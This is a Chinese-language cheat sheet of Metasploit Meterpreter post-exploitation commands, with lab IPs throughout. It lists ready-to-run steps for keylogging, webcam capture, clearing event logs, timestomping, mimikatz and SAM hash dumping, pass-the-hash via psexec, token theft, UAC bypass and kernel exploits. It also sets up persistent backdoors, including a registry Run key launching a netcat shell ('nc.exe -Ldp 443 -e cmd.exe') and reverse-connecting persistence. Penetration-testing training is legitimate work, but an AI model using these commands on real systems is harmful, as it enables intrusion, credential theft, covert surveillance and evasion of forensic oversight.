<div id="topic_content" class="topic-content markdown-body">
                
                    <p></p><p>Metasploit中的Meterpreter模块在后渗透阶段具有强大的攻击力，本文主要整理了meterpreter的常用命令、脚本及使用方式。包含信息收集、提权、注册表操作、令牌操纵、哈希利用、后门植入等。</p>
<h3 id="toc-0">0x01.系统命令</h3>
<h4 id="toc-1">1）基本系统命令</h4>

<pre><code>sessions    #sessions Ch 查看帮助
sessions -i &lt;ID值&gt;  #进入会话   -k  杀死会话
background  #将当前会话放置后台
run  #执行已有的模块，输入run后按两下tab，列出已有的脚本
info #查看已有模块信息
getuid # 查看权限 
getpid # 获取当前进程的pid
sysinfo # 查看目标机系统信息
ps # 查看当前活跃进程    kill &lt;PID值&gt; 杀死进程
idletime #查看目标机闲置时间
reboot / shutdown   #重启/关机
shell #进入目标机cmd shell</code></pre>
<h4 id="toc-2">2）uictl开关键盘/鼠标</h4>

<pre><code>uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标
uictl disable mouse  #禁用鼠标
uictl disable keyboard  #禁用键盘</code></pre>
<p><a id="img0" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8d78731c-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8d78731c-998c-1.png"></a></p>
<h4 id="toc-3">3）webcam摄像头命令</h4>

<pre><code>webcam_list  #查看摄像头
webcam_snap   #通过摄像头拍照
webcam_stream   #通过摄像头开启视频</code></pre>
<p><a id="img1" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8d93ac72-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8d93ac72-998c-1.png"></a><br>
<a id="img2" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8da675dc-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8da675dc-998c-1.png"></a></p>
<h4 id="toc-4">4）execute执行文件</h4>

<pre><code>execute #在目标机中执行文件
execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</code></pre>
<p><a id="img3" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8db2c63e-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8db2c63e-998c-1.png"></a></p>
<h4 id="toc-5">5）migrate进程迁移</h4>

<pre><code>getpid    # 获取当前进程的pid
ps   # 查看当前活跃进程
migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中
kill &lt;pid值&gt;   #杀死进程</code></pre>
<h4 id="toc-6">6）clearav清除日志</h4>

<pre><code>clearav  #清除windows中的应用程序日志、系统日志、安全日志</code></pre>
<h3 id="toc-7">0x02.文件系统命令</h3>
<h4 id="toc-8">1）基本文件系统命令</h4>

<pre><code>getwd 或者pwd # 查看当前工作目录  
ls
cd
search -f *pass*       # 搜索文件  -h查看帮助
cat c:\\lltest\\lltestpasswd.txt  # 查看文件内容
upload /tmp/hack.txt C:\\lltest  # 上传文件到目标机上
download c:\\lltest\\lltestpasswd.txt /tmp/ # 下载文件到本机上
edit c:\\1.txt #编辑或创建文件  没有的话，会新建文件
rm C:\\lltest\\hack.txt
mkdir lltest2  #只能在当前目录下创建文件夹
rmdir lltest2  #只能删除当前目录下文件夹
getlwd   或者 lpwd   #操作攻击者主机 查看当前目录
lcd /tmp   #操作攻击者主机 切换目录</code></pre>
<h4 id="toc-9">2）timestomp伪造时间戳</h4>

<pre><code>timestomp C:// -h   #查看帮助
timestomp -v C://2.txt   #查看时间戳
timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</code></pre>
<p><a id="img4" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8dc36548-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8dc36548-998c-1.png"></a></p>
<h3 id="toc-10">0x03.网络命令</h3>
<h4 id="toc-11">1）基本网络命令</h4>

<pre><code>ipconfig/ifconfig
netstat Cano
arp
getproxy   #查看代理信息
route   #查看路由</code></pre>
<h4 id="toc-12">2）portfwd端口转发</h4>

<pre><code>portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口</code></pre>
<p><a id="img5" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8dd84710-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8dd84710-998c-1.png"></a><br>
<a id="img6" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8df589f6-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8df589f6-998c-1.png"></a></p>
<h4 id="toc-13">3）autoroute添加路由</h4>

<pre><code>run autoroute Ch #查看帮助
run autoroute -s 192.168.159.0/24  #添加到目标环境网络
run autoroute Cp  #查看添加的路由</code></pre>
<p>然后可以利用arp_scanner、portscan等进行扫描</p>

<pre><code>run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24
run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389</code></pre>
<p><a id="img7" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e0bdbca-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e0bdbca-998c-1.png"></a><br>
<a id="img8" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e1d7ec0-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e1d7ec0-998c-1.png"></a></p>
<h4 id="toc-14">4）Socks4a代理</h4>
<p>autoroute添加完路由后，还可以利用msf自带的sock4a模块进行Socks4a代理</p>

<pre><code>msf&gt; use auxiliary/server/socks4a 
msf &gt; set srvhost 127.0.0.1
msf &gt; set srvport 1080
msf &gt; run</code></pre>
<p>然后vi /etc/proxychains.conf   #添加 socks4 127.0.0.1 1080<br>
最后proxychains  使用Socks4a代理访问</p>
<p><a id="img9" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e2ebffa-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e2ebffa-998c-1.png"></a></p>
<h3 id="toc-15">0x04.信息收集</h3>
<p>信息收集的脚本位于：</p>

<pre><code>/usr/share/metasploit-framework/modules/post/windows/gather
/usr/share/metasploit-framework/modules/post/linux/gather</code></pre>
<p><a id="img10" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e454716-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e454716-998c-1.png"></a></p>
<p>信息收集的脚本较多，仅列几个常用的：</p>

<pre><code>run post/windows/gather/checkvm #是否虚拟机
run post/linux/gather/checkvm #是否虚拟机
run post/windows/gather/forensics/enum_drives #查看分区
run post/windows/gather/enum_applications #获取安装软件信息
run post/windows/gather/dumplinks   #获取最近的文件操作
run post/windows/gather/enum_ie  #获取IE缓存
run post/windows/gather/enum_chrome   #获取Chrome缓存
run post/windows/gather/enum_patches  #补丁信息
run post/windows/gather/enum_domain  #查找域控</code></pre>
<h3 id="toc-16">0x05.提权</h3>
<h4 id="toc-17">1)getsystem提权</h4>

<pre><code>getsystem</code></pre>
<p>getsystem工作原理：<br>
①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>
②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>
③Windows服务已启动，导致与命名管道建立连接。<br>
④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>
然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。<br>
<a id="img11" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e5f42e2-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e5f42e2-998c-1.png"></a></p>
<h4 id="toc-18">2)bypassuac</h4>
<p>内置多个pypassuac脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行getsystem获取系统权限，如：</p>

<pre><code>use exploit/windows/local/bypassuac
use exploit/windows/local/bypassuac_injection
use windows/local/bypassuac_vbs
use windows/local/ask</code></pre>
<p>如使用bypassuac.rb脚本：</p>

<pre><code>msf &gt; use exploit/windows/local/bypassuac
msf &gt; set SESSION 2
msf &gt; run</code></pre>
<p><a id="img12" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e75a848-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e75a848-998c-1.png"></a></p>
<h4 id="toc-19">3)内核漏洞提权</h4>
<p>可先利用enum_patches模块 收集补丁信息，然后查找可用的exploits进行提权</p>

<pre><code>meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息
msf &gt; use exploit/windows/local/ms13_053_schlamperei
msf &gt; set SESSION 2
msf &gt; exploit</code></pre>
<p><a id="img13" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8e85924e-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8e85924e-998c-1.png"></a><br>
<a id="img14" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8e9b89e6-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8e9b89e6-998c-1.png"></a></p>
<h3 id="toc-20">0x06.mimikatz抓取密码</h3>

<pre><code>load mimikatz    #help mimikatz 查看帮助
wdigest  #获取Wdigest密码
mimikatz_command -f samdump::hashes  #执行mimikatz原始命令
mimikatz_command -f sekurlsa::searchPasswords</code></pre>
<p><a id="img15" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8eac2e2c-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8eac2e2c-998c-1.png"></a><br>
<a id="img16" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8ebb6bc6-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8ebb6bc6-998c-1.png"></a></p>
<h3 id="toc-21">0x07.远程桌面&amp;截屏</h3>

<pre><code>enumdesktops  #查看可用的桌面
getdesktop    #获取当前meterpreter 关联的桌面
set_desktop   #设置meterpreter关联的桌面  -h查看帮助
screenshot  #截屏
use espia  #或者使用espia模块截屏  然后输入screengrab
run vnc  #使用vnc远程桌面连接</code></pre>
<p><a id="img17" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8ee6331a-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8ee6331a-998c-1.png"></a><br>
<a id="img18" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f1a70c6-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f1a70c6-998c-1.png"></a></p>
<h3 id="toc-22">0x08.开启rdp&amp;添加用户</h3>
<h4 id="toc-23">1)getgui命令</h4>

<pre><code>run getgui Ch #查看帮助
run getgui -e #开启远程桌面
run getgui -u lltest2 -p 123456   #添加用户
run getgui -f 6661 Ce   #3389端口转发到6661</code></pre>
<p>getgui 系统不推荐，推荐使用run post/windows/manage/enable_rdp<br>
getgui添加用户时，有时虽然可以成功添加用户，但是没有权限通过远程桌面登陆<br>
<a id="img19" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f3485ce-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f3485ce-998c-1.png"></a><br>
<a id="img20" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f42c288-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f42c288-998c-1.png"></a></p>
<h4 id="toc-24">2)enable_rdp脚本</h4>

<pre><code>run post/windows/manage/enable_rdp  #开启远程桌面
run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户
run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662</code></pre>
<p>脚本位于/usr/share/metasploit-framework/modules/post/windows/manage/enable_rdp.rb<br>
通过enable_rdp.rb脚本可知：开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令<br>
<a id="img21" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f547726-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f547726-998c-1.png"></a><br>
<a id="img22" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f692b80-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f692b80-998c-1.png"></a></p>
<h3 id="toc-25">0x09.键盘记录</h3>

<pre><code>keyscan_start  #开始键盘记录
keyscan_dump   #导出记录数据
keyscan_stop #结束键盘记录</code></pre>
<p><a id="img23" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f75ddc6-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f75ddc6-998c-1.png"></a></p>
<h3 id="toc-26">0x10.sniffer抓包</h3>

<pre><code>use sniffer
sniffer_interfaces   #查看网卡
sniffer_start 2   #选择网卡 开始抓包
sniffer_stats 2   #查看状态
sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包
sniffer_stop 2   #停止抓包</code></pre>
<p><a id="img24" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f86f804-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f86f804-998c-1.png"></a></p>
<h3 id="toc-27">0x11.注册表操作</h3>
<h4 id="toc-28">1)注册表基本命令</h4>

<pre><code>reg Ch
    -d   注册表中值的数据.    -k   注册表键路径    -v   注册表键名称
    enumkey 枚举可获得的键    setval 设置键值    queryval 查询键值数据</code></pre>
<h4 id="toc-29">2)注册表设置nc后门</h4>

<pre><code>upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc
reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe' #设置键值
reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值

nc -v 192.168.159.144 443  #攻击者连接nc后门</code></pre>
<p><a id="img25" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f98f61c-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f98f61c-998c-1.png"></a><br>
<a id="img26" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fbd4d32-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fbd4d32-998c-1.png"></a><br>
<a id="img27" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fcc6452-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fcc6452-998c-1.png"></a></p>
<h3 id="toc-30">0x12.令牌操纵</h3>
<h4 id="toc-31">1)incognito假冒令牌</h4>

<pre><code>use incognito      #help incognito  查看帮助
list_tokens -u    #查看可用的token
impersonate_token 'NT AUTHORITY\SYSTEM'  #假冒SYSTEM token
或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\
execute -f cmd.exe -i Ct    # -t 使用假冒的token 执行
或者直接shell
rev2self   #返回原始token</code></pre>
<p><a id="img28" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fdf8654-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fdf8654-998c-1.png"></a></p>
<h4 id="toc-32">2)steal_token窃取令牌</h4>

<pre><code>steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps
drop_token  #删除窃取的token</code></pre>
<p><a id="img29" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fee2862-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fee2862-998c-1.png"></a></p>
<h3 id="toc-33">0x13.哈希利用</h3>
<h4 id="toc-34">1)获取哈希</h4>

<pre><code>run post/windows/gather/smart_hashdump  #从SAM导出密码哈希
#需要SYSTEM权限</code></pre>
<p><a id="img30" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8ffec58c-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8ffec58c-998c-1.png"></a></p>
<h4 id="toc-35">2)PSExec哈希传递</h4>
<p>通过smart_hashdump获取用户哈希后，可以利用psexec模块进行哈希传递攻击<br>
前提条件：①开启445端口 smb服务；②开启admin$共享</p>

<pre><code>msf &gt; use exploit/windows/smb/psexec
msf &gt; set payload windows/meterpreter/reverse_tcp
msf &gt; set LHOST 192.168.159.134
msf &gt; set LPORT 443
msf &gt; set RHOST 192.168.159.144
msf &gt;set SMBUser Administrator
msf &gt;set SMBPass aad3b4*****04ee:5b5f00*****c424c
msf &gt;set SMBDomain  WORKGROUP   #域用户需要设置SMBDomain
msf &gt;exploit</code></pre>
<p><a id="img31" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-900da246-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-900da246-998c-1.png"></a><br>
<a id="img32" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-901e3d36-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-901e3d36-998c-1.png"></a></p>
<h3 id="toc-36">0x14.后门植入</h3>
<p>metasploit自带的后门有两种方式启动的，一种是通过启动项启动(persistence)，一种是通过服务启动(metsvc)，另外还可以通过persistence_exe自定义后门文件。</p>
<h4 id="toc-37">1)persistence启动项后门</h4>
<p>在C:\Users***\AppData\Local\Temp\目录下，上传一个vbs脚本<br>
在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项</p>

<pre><code>run persistence Ch  #查看帮助
run persistence -X -i 5 -p 6661 -r 192.168.159.134
#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) Cr 指定攻击者的ip</code></pre>
<p><a id="img33" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-902cd47c-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-902cd47c-998c-1.png"></a><br>
<a id="img34" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-9041d688-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-9041d688-998c-1.png"></a></p>
<p><strong>连接后门</strong></p>

<pre><code>msf &gt; use exploit/multi/handler
msf &gt; set payload windows/meterpreter/reverse_tcp
msf &gt; set LHOST 192.168.159.134
msf &gt; set LPORT 6661
msf &gt; exploit</code></pre>
<p><a id="img35" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-9051352e-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-9051352e-998c-1.png"></a></p>
<h4 id="toc-38">2)metsvc服务后门</h4>
<p>在C:\Users***\AppData\Local\Temp\上传了三个文件（metsrv.x86.dll、metsvc-server.exe、metsvc.exe），通过服务启动，服务名为meterpreter</p>

<pre><code>run metsvc Ch   # 查看帮助
run metsvc CA   #自动安装后门</code></pre>
<p><a id="img36" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-9060162a-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-9060162a-998c-1.png"></a><br>
<a id="img37" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-9077bb4a-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-9077bb4a-998c-1.png"></a></p>
<p><strong>连接后门</strong></p>

<pre><code>msf &gt; use exploit/multi/handler
msf &gt; set payload windows/metsvc_bind_tcp
msf &gt; set RHOST 192.168.159.144
msf &gt; set LPORT 31337
msf &gt; exploit</code></pre>
<p><a id="img38" href="https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-90b333b4-998c-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-90b333b4-998c-1.png"></a></p>
<h3 id="toc-39">0x15.扫描脚本</h3>
<p>扫描的脚本位于：<br>
/usr/share/metasploit-framework/modules/auxiliary/scanner/<br>
扫描的脚本较多，仅列几个代表：</p>

<pre><code>use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/jboss_vulnscan
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/oracle/oracle_login</code></pre>
<p><strong>参考:</strong><br>
<a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-command-cheat-sheet-for-metasploits-meterpreter-0149146/" target="_blank">https://null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-command-cheat-sheet-for-metasploits-meterpreter-0149146/</a><br>
<a href="https://thehacktoday.com/metasploit-commands/" target="_blank">https://thehacktoday.com/metasploit-commands/</a><br>
<a href="https://www.offensive-security.com/metasploit-unleashed/fun-incognito/" target="_blank">https://www.offensive-security.com/metasploit-unleashed/fun-incognito/</a><br>
<a href="https://www.offensive-security.com/metasploit-unleashed/persistent-netcat-backdoor/" target="_blank">https://www.offensive-security.com/metasploit-unleashed/persistent-netcat-backdoor/</a><br>
<a href="https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/" target="_blank">https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/</a><br>
<a href="http://www.hackingarticles.in/7-ways-to-privilege-escalation-of-windows-7-pc-bypass-uac/" target="_blank">http://www.hackingarticles.in/7-ways-to-privilege-escalation-of-windows-7-pc-bypass-uac/</a><br>
<a href="https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/" target="_blank">https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/</a><br>
<a href="http://wooyun.jozxing.cc/static/drops/tips-2227.html" target="_blank">http://wooyun.jozxing.cc/static/drops/tips-2227.html</a></p>
<p></p>
                
            </div>

## 后渗透阶段利用2

- [freebuf 后渗透阶段利用](https://www.freebuf.com/sectool/154752.html)